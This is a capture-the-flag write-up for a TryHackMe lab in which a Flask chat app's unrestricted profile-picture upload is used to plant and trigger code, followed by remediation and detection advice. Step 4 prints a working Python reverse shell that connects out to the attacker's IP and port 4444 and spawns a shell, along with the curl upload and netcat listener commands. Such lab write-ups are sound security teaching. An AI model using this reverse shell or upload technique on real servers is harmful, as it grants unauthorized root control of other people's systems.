@@ -1,0 +1,92 @@
+# Room Name - TryHackMe: Speed Chatting
+Date: 02 August 2026
+Difficulty: Easy
+Category: Web Exploitation / Unrestricted File Upload / Remote Code Execution
+
+# Scenario
+TryHeartMe rushed out a new messaging platform called Speed Chatter days before Valentine's Day. In the race to beat the holiday deadline, security took a back seat and the platform was pushed to production without proper testing. The challenge involved identifying an unrestricted file upload vulnerability, uploading a Python reverse shell, and triggering execution by visiting the uploaded file's URL.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- curl
+- gobuster
+- netcat (nc)
+- Python 3 (reverse shell)
+
+# What I Did
+
+Step 1 — Reconnaissance and route enumeration
+- Fingerprinted the application and confirmed Flask/Werkzeug on Python.
+- Identified five available routes on the single-page app:
+  - / (main page)
+  - /upload_profile_pic (file upload endpoint)
+  - /uploads/<file> (direct file access)
+  - /api/messages (message retrieval)
+  - /api/send_message (message submission)
+- Noted the app had no authentication, no session cookies, and operated as a single global demo user.
+
+Step 2 — Enumerate for additional attack surface
+- Ran gobuster for additional hidden routes.
+- Tested URL path traversal, malformed JSON payloads, race conditions on message sending, and debug mode probing.
+- Confirmed no additional attack surface — the actual vulnerability was in the upload endpoint.
+
+Step 3 — Identify the unrestricted file upload vulnerability
+- Tested the /upload_profile_pic endpoint and confirmed:
+  - No file extension filtering
+  - No content-type validation
+  - No execution restriction on served files
+  - Uploaded files stored under /uploads/ and directly reachable via URL
+  - Visiting an uploaded .py file's URL triggered server-side execution rather than serving it as static text
+
+Step 4 — Build and upload a Python reverse shell
+- Created a Python reverse shell script (rev.py):
+```python
+import socket, subprocess, os
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.48.127.151", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+```
+- Started a netcat listener:
+```
+nc -lvnp 4444
+```
+- Uploaded the reverse shell via curl:
+```
+curl -s -X POST http://10.48.178.14:5000/upload_profile_pic -F "profile_pic=@rev.py"
+```
+- Server returned the upload path: /uploads/profile_e4cd27c6-d81d-4e1b-a201-1716900e8068.py
+
+Step 5 — Trigger execution and catch the shell
+- Visited the uploaded file's URL directly in the browser to trigger server-side execution.
+- Caught a reverse shell on the netcat listener immediately.
+- Confirmed the shell was running as root with no privilege escalation required, the Flask application itself ran as root.
+
+Step 6 — Retrieve the flag
+```
+whoami
+ls -la
+cat flag.txt
+```
+
+# What I Found
+- Upload endpoint: /upload_profile_pic (no filtering, no validation)
+- Uploaded file path: /uploads/profile_e4cd27c6-d81d-4e1b-a201-1716900e8068.py
+- Shell obtained as: root (application running as root process)
+- No privilege escalation required
+- Flag location: /flag.txt (in the application root directory)
+- Flag: THM{R3v3rs3_Sh3ll_L0v3_C0nn3ct10ns}
+
+# Key Learning
+Unrestricted file upload is one of the most direct paths to remote code execution in web applications. The absence of three independent controls simultaneously — extension filtering, content-type validation, and execution restriction on the upload directory — meant a single POST request was enough to plant executable code on the server. The impact was made immediately critical by the Flask process running as root, collapsing what would otherwise be a two-step attack (upload then escalate) into a single step. File uploads should be treated as untrusted data requiring validation at every layer: allowed extension allowlist, MIME type verification, content inspection, randomised storage paths, and critically, the upload directory must never be served in a way that allows execution.
+
+# What I Would Flag in a Real SOC
+- Any file upload endpoint that accepts arbitrary file types without an explicit allowlist of safe extensions is a critical finding and should be flagged for immediate remediation regardless of the application's other security controls
+- Upload directories served directly under the web root with execution permissions enabled are a configuration-level vulnerability, uploaded files must be stored outside the web root or in a location explicitly configured to serve files as static content only
+- A web application process running as root means any RCE vulnerability immediately grants full system compromise with no further steps, all web-facing application processes must run as a dedicated non-root service account with the minimum required permissions
+- The combination of no authentication and an unrestricted file upload endpoint is a pre-authentication RCE vulnerability accessible to any anonymous user, this is a P0 severity finding in any bug bounty or penetration test
+- Randomly generated filenames for uploads (the UUID prefix in the stored filename) are a positive control that prevents direct filename prediction but are insufficient on their own when the extension is preserved and the upload directory allows execution
+- Network egress monitoring should alert on outbound TCP connections from web server processes to external IPs on non-standard ports, a reverse shell connection from a Flask process to port 4444 is an unambiguous indicator of compromise
